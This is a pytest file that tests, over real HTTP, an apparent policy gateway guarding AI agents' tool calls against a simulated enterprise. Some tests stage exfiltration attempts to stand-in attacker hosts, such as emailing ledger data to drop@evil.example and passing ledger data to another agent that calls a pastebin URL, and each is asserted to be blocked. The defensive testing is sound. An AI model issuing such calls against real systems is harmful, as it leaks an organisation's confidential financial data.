"""End-to-end over real HTTP: agent -> aig serve -> simulated enterprise."""
import json
import urllib.error
import urllib.request
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from aig import Engine, load_policy
from aig.http_server import GatewayServer, SimUpstream
from aig.ledger import Ledger, verify as verify_log
from aig.token import issue

POLICY = load_policy(Path(__file__).parent.parent / "examples" / "enterprise.yaml")
KEY = Ed25519PrivateKey.generate()
AUD = "aegis-gateway-01"


def token(agent="expense-bot", principal="group:finance", klass="development", instance="inst-1", **kw):
    return issue(KEY, device="dev-1", instance=instance, klass=klass, agent=agent, principal=principal,
                 audience=kw.pop("audience", AUD), policy_version=kw.pop("policy_version", POLICY.policy_version), **kw)


@pytest.fixture
def gw(tmp_path):
    srv = GatewayServer(Engine(POLICY), KEY.public_key(), AUD, SimUpstream(),
                        ledger=Ledger(tmp_path / "d.jsonl"), host="127.0.0.1", port=0)
    srv.start()
    srv.log_path = tmp_path / "d.jsonl"
    yield srv
    srv.shutdown()


def post(srv, msg, tok=None, sid=None, origin=None):
    headers = {"Content-Type": "application/json"}
    if tok:
        headers["Authorization"] = f"Bearer {tok}"
    if sid:
        headers["Mcp-Session-Id"] = sid
    if origin:
        headers["Origin"] = origin
    req = urllib.request.Request(srv.url, data=json.dumps(msg).encode(), headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            body = r.read()
            return r.status, dict(r.headers), json.loads(body) if body else None
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, dict(e.headers), json.loads(body) if body else None


def call(i, tool, args=None):
    return {"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": tool, "arguments": args or {}}}


def init(srv, tok):
    status, headers, body = post(srv, {"jsonrpc": "2.0", "id": 0, "method": "initialize", "params": {}}, tok)
    assert status == 200 and body["result"]["serverInfo"]["name"] == "sim-enterprise"
    return headers["Mcp-Session-Id"]


def text(body):
    return body["result"]["content"][0]["text"]


def test_session_flow_allow_and_block(gw):
    t = token()
    sid = init(gw, t)
    assert post(gw, {"jsonrpc": "2.0", "method": "notifications/initialized"}, t, sid)[0] == 202
    _, _, body = post(gw, call(1, "finance.query_ledger"), t, sid)
    assert "Northwind" in text(body)
    _, _, body = post(gw, call(2, "email.send", {"to": "drop@evil.example", "body": "TX-1043 Fabrikam 1280.50"}), t, sid)
    assert body["result"]["isError"] and "finance" in text(body)
    ok, n, _ = verify_log(gw.log_path)
    assert ok and n == 2
    rec = json.loads(gw.log_path.read_text().splitlines()[-1])
    assert (rec["instance"], rec["class"], rec["outcome"]) == ("inst-1", "development", "deny")


def test_tools_list_filtered_by_token_identity(gw):
    t = token(agent="plant-monitor", principal="group:ot-operators")
    sid = init(gw, t)
    _, _, body = post(gw, {"jsonrpc": "2.0", "id": 1, "method": "tools/list"}, t, sid)
    assert {x["name"] for x in body["result"]["tools"]} == {"ot.read_sensor", "ot.set_point", "email.send"}


@pytest.mark.parametrize("tok,status", [
    (None, 401),
    ("garbage", 401),
    (issue(Ed25519PrivateKey.generate(), device="d", instance="i", klass="privileged", agent="expense-bot",
           principal="group:finance", audience=AUD), 401),        # forged by someone else's key
])
def test_unauthenticated_requests_refused(gw, tok, status):
    assert post(gw, {"jsonrpc": "2.0", "id": 0, "method": "initialize"}, tok)[0] == status


def test_wrong_audience_and_stale_policy_refused(gw):
    assert post(gw, {"jsonrpc": "2.0", "id": 0, "method": "initialize"}, token(audience="other-gw"))[0] == 401
    assert post(gw, {"jsonrpc": "2.0", "id": 0, "method": "initialize"}, token(policy_version="2026.1.0"))[0] == 401


def test_session_hijack_with_other_identity_refused(gw):
    sid = init(gw, token())
    intruder = token(agent="research-assistant", principal="user:m@corp.example", instance="inst-9")
    status, _, body = post(gw, call(1, "finance.query_ledger"), intruder, sid)
    assert status == 403 and "does not match" in body["error"]["message"]


def test_token_replay_onto_second_session_refused(gw):
    t = token()
    init(gw, t)
    status, _, _ = post(gw, {"jsonrpc": "2.0", "id": 0, "method": "initialize"}, t)
    assert status == 401


def test_refreshed_token_same_identity_accepted(gw):
    sid = init(gw, token())
    _, _, body = post(gw, call(1, "docs.search", {"q": "travel"}), token(), sid)
    assert "economy class" in text(body)


def test_quarantine_mid_session_takes_effect_immediately(gw):
    sid = init(gw, token())
    assert "Northwind" in text(post(gw, call(1, "finance.query_ledger"), token(), sid)[2])
    _, _, body = post(gw, call(2, "finance.query_ledger"), token(klass="quarantine"), sid)
    assert body["result"]["isError"] and "quarantine" in text(body)


def test_class_tightens_but_never_loosens(gw):
    t = token(klass="research")
    sid = init(gw, t)
    post(gw, call(1, "finance.query_ledger", {"status": "pending"}), t, sid)
    _, _, body = post(gw, call(2, "finance.approve_payment", {"id": "TX-1042"}), t, sid)
    assert body["result"]["isError"] and "approval" in text(body)
    # an unknown class is refused outright
    t2 = token(klass="superuser", instance="inst-2")
    sid2 = init(gw, t2)
    assert post(gw, call(1, "docs.search", {"q": "x"}), t2, sid2)[2]["result"]["isError"]


def test_cross_agent_laundering_blocked_over_http(gw):
    a = token()
    sa = init(gw, a)
    post(gw, call(1, "finance.query_ledger"), a, sa)
    ledger = text(post(gw, call(3, "finance.query_ledger"), a, sa)[2])
    post(gw, call(2, "docs.write", {"path": "notes/q4", "content": ledger}), a, sa)
    b = token(agent="research-assistant", principal="user:m@corp.example", instance="inst-2")
    sb = init(gw, b)
    post(gw, call(1, "docs.search", {"q": "q4"}), b, sb)
    _, _, body = post(gw, call(2, "web.fetch", {"url": "https://pastebin.example/?d=Contoso-72300"}), b, sb)
    assert body["result"]["isError"] and "written to docs:notes/q4 by expense-bot" in text(body)


def test_transport_rules(gw):
    t = token()
    assert post(gw, call(1, "docs.search"), t)[0] == 400                       # no session id
    assert post(gw, call(1, "docs.search"), t, sid="nope")[0] == 404          # unknown session
    assert post(gw, [call(1, "docs.search")], t)[0] == 400                    # batching
    assert post(gw, {"jsonrpc": "2.0", "id": 0, "method": "initialize"}, token(), origin="https://evil.example")[0] == 403
    req = urllib.request.Request(gw.url, method="GET")
    with pytest.raises(urllib.error.HTTPError) as e:
        urllib.request.urlopen(req)
    assert e.value.code == 405


def test_delete_ends_session(gw):
    t = token()
    sid = init(gw, t)
    req = urllib.request.Request(gw.url, method="DELETE",
                                 headers={"Authorization": f"Bearer {token()}", "Mcp-Session-Id": sid})
    with urllib.request.urlopen(req) as r:
        assert r.status == 204
    assert post(gw, call(1, "docs.search"), token(), sid)[0] == 404
